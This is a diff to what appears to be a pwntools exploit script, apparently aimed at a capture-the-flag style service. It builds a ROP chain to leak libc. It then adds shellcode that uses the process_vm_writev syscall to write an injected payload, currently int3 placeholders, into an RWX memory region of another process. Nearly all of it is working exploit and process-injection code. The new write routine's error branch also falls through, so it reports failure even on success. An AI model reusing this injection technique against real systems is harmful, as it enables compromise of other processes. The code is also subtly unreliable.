@@ -123,9 +123,17 @@ do_it:
     mov rsi,{len(Const.hello_msg)}
     call echo_msg
 
-    mov rdi,675
-    mov rsi,0xdeadbeef
-    mov rdx,0x2000
+    mov rdi,1066
+    lea rsi,[rip+final_shellcode]
+    mov rdx,the_end - final_shellcode
+    mov r10,{hex(Const.cds_rwx_base)}
+    call write_process_mem
+
+    call exit
+
+    mov rdi,1066
+    mov rsi,{hex(Const.cds_rwx_base)}
+    mov rdx,{hex(Const.cds_rwx_size)}
     call read_process_mem
 
     call exit
@@ -206,18 +214,58 @@ read_process_mem_err:
     call echo_msg
     ret
 
-/* TODO: we may need to read() in from this script to determine what we 
-         want to write */
+/* Args:
+    - rdi: PID of process whose memory to read.
+    - rsi: Local memory address containing data to write
+    - rdx: Length of data to write to remote process
+    - r10: Remote memory address to write to
+   Read data is placed into the iovec_local region.
+*/
 write_process_mem:
-    nop
+    mov rbx,rsi
+    mov rcx,rdx
+    mov r12,r10
+    /* Setup local iovec, indicating what local data should be written to the
+       remote process. */
+    mov rsi,{hex(Const.iovec_local)}
+    mov [rsi+0],rbx
+    mov [rsi+8],rcx
+    mov rdx,1
+    /* Setup remote iovec, indicating where we should be writing in the remote
+       process. */
+    mov r10,{hex(Const.iovec_remote)}
+    mov [r10+0],r12
+    mov [r10+8],rcx
+    mov r8,1
+    /* No flags. */
+    mov r9,0
+    /* Do the syscall. */
+    mov rax,{Const.SYS_process_vm_writev}
+    syscall
+    /* rax now holds how many bytes were written to the remote process memory,
+       or -1 on error. */
+    cmp rax,0
+    jle write_process_mem_err
+write_process_mem_err:
+    lea rdi,[rip+process_write_err]
+    mov rsi,{len(Const.process_write_err)}
+    call echo_msg
     ret
 
 exit:
     mov rax,SYS_exit
     syscall
+
+final_shellcode:
+    int3
+    int3
+    int3
+    int3
+    int3
+the_end:
+    nop
 """
 shellcode = asm(shellcode, vma=Const.mmap_base)
-log.info("Shellcode length: %i" % len(shellcode))
 
 def recv_shellcode_msg():
     io.recvuntil(Const.msg_prologue)
@@ -232,6 +280,9 @@ def do_rop(*gadgets):
     chain += flat(*gadgets)
     assert len(chain) <= 0x200
     io.sendafter("warden: ", chain)
+
+if args.PAUSE:
+    input("Pausing before sending anything...")
 
 # leak a libc address
 do_rop(
